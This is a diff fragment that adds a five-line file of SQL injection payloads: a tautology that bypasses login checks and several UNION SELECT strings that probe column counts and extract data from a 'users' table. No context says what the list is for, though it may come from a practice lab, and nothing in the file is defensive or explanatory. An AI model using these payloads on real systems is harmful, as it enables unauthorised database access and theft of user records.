@@ -1,0 +1,5 @@
+' or '1=1' '
+1' UNION ALL SELECT NULL FROM DUAL#
+1' UNION SELECT 'First name', 'Surname', 'Id' from users#
+1' UNION SELECT 1, 2 from users # // 1 and 2 are columns
+1' UNION SELECT 1, 2, 3 from users #
